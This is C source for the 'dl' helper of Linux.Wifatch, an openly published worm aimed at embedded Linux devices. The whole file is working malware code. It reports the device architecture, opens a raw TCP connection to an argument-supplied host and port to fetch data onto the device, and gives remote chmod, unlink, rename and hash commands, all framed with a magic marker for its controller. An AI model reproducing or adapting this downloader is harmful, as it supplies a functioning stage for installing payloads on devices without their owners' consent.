
/*
 * This file is part of Linux.Wifatch
 *
 * Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
 *
 * Linux.Wifatch is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Linux.Wifatch is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
 */

// usage: dl q -- query arch
// usage: dl y -- sync
// usage: dl n hostN port a-p-hexcommand
// usage: dl m perm filename -- chmod
// usage: dl u filename -- unlink
// usage: dl r filename filename -- rename
// usage: dl 1 < filename -- fnv1
// usage: dl d < path -- df
// NON usage: dl r > filename -- write file (like rf)

#include <errno.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <inttypes.h>
#include <sys/statfs.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <inttypes.h>
#include <signal.h>
#include <string.h>
#include <time.h>

#include "tinyutil.h"
#include "uclibc-tiny.h"

#define MAGIC "Yee1Ahwv"

__attribute__ ((noinline))
static wrmagic(void)
{
        write(1, MSG(MAGIC));
}

// FNV-1a hash of stdin
static int hash(void)
{
        uint8_t *p;
        uint32_t hval = 2166136261U;
        uint32_t size = 0;

        for (;;) {
                int len = read(0, buffer, sizeof buffer);

                if (len <= 0)
                        break;

                size += len;

                for (p = buffer; p < buffer + len; ++p) {
                        hval ^= *p;
                        hval *= 16777619;
                }
        }

        wrmagic();
        prnum(hval);
        prnum(size);
        wrmagic();

        return 0;
}

static int df(void)
{
        struct statfs sfsbuf;

        if (fstatfs(0, &sfsbuf))
                return 1;

        wrmagic();
        prnum(sfsbuf.f_type);
        prnum(sfsbuf.f_bsize);
        prnum(sfsbuf.f_blocks);
        prnum(sfsbuf.f_bfree);
        prnum(sfsbuf.f_bavail);
        prnum(sfsbuf.f_files);
        prnum(sfsbuf.f_ffree);
        wrmagic();

        return 0;
}

static int wget(int argc, char *argv[])
{
        int fd = socket(AF_INET, SOCK_STREAM, 0);

        if (fd < 0)
                return 1;

        struct sockaddr_in sa;

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = htonl(atoi(argv[2]));
        sa.sin_port = htons(atoi(argv[3]));

        if (connect(fd, (struct sockaddr *)&sa, sizeof (sa))) {
                write(1, MSG("connect"));
                return 3;
        }

        {
                char *c = argv[4];
                uint8_t *d = buffer;

                while (*c) {
                        *d++ = (c[0] - 'a') * 16 + (c[1] - 'a');
                        c += 2;
                }

                write(fd, buffer, d - buffer);
        }

        for (;;) {
                int len = read(fd, buffer, sizeof (buffer));

                if (len <= 0)
                        break;

                write(1, buffer, len);
                write(2, MSG("."));
        }

        fsync(1);

        return 0;
}

int main(int argc, char *argv[])
{
        setpriority(PRIO_PROCESS, 0, -20);

        switch (*argv[1]) {
          case 'q':
                  wrmagic();
                  write(1, MSG("<" arch ">\n"));
                  break;
          case 'y':
                  sync();
                  break;
          case 'u':
                  unlink(argv[2]);
                  break;
          case 'r':
                  rename(argv[2], argv[3]);
                  break;
          case 'm':
                  chmod(argv[3], atoi(argv[2]));
                  break;
          case '1':
                  return hash();
          case 'd':
                  return df();
          case 'n':
                  return wget(argc, argv);
          default:
                  return 126;
        }

        return 0;
}
